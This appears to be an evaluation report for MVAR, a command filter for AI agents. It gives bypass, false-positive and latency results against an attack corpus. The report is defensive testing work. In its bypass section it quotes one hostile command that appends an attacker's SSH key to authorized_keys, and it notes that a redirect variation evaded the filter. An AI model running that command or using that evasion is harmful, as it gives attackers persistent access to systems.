# MVAR Adversarial Evaluation Report

**Policy Profile:** strict
**Attack Corpus:** tests/adversarial/corpus_attacks.json
**Benign Corpus:** tests/adversarial/corpus_benign.json
**Variants Per Attack:** 10

---

## Summary Metrics

| Metric | Value | Target | Status |
|--------|-------|--------|--------|
| **Bypass Rate** | 0.20% | < 10% | ✅ PASS |
| **False Positive Rate** | 0.00% | < 5% | ✅ PASS |
| **p95 Latency** | 0.13 ms | < 10ms | ✅ PASS |

---

## Attack Results

**Total Attacks:** 50
**Total Variants Tested:** 500
**Bypasses:** 1
**Blocks:** 499
**Bypass Rate:** 0.20%

### Bypass Rate by Category

| Category | Bypass Rate |
|----------|-------------|
| credential_harvesting | 0.00% |
| data_exfiltration | 0.00% |
| destructive_operations | 0.00% |
| lateral_movement | 0.00% |
| privilege_escalation | 1.00% |

---

## Benign Command Results

**Total Benign Commands:** 100
**False Positives:** 0
**False Positive Rate:** 0.00%

### False Positive Rate by Category

| Category | FP Rate |
|----------|---------|
| development_tools | 0.00% |
| directory_listing | 0.00% |
| file_reading | 0.00% |
| git_operations | 0.00% |
| package_management | 0.00% |

---

## Latency Analysis

| Percentile | Latency (ms) |
|------------|--------------|
| p50 (median) | 0.05 |
| p95 | 0.13 |
| p99 | 0.24 |
| mean | 0.07 |

---

## Bypasses Found


### PRIVESC_003: Modify SSH authorized_keys to add attacker key

**Category:** privilege_escalation
**Severity:** critical
**Base Command:** `echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB... attacker@evil.com' >> ~/.ssh/authorized_keys`
**Successful Transformations:** redirect_variation
**Bypasses:** 1/10


---

## False Positives


✅ **No false positives found.**

---

**Generated:** {timestamp}
**MVAR Version:** 1.5.4 (planned)
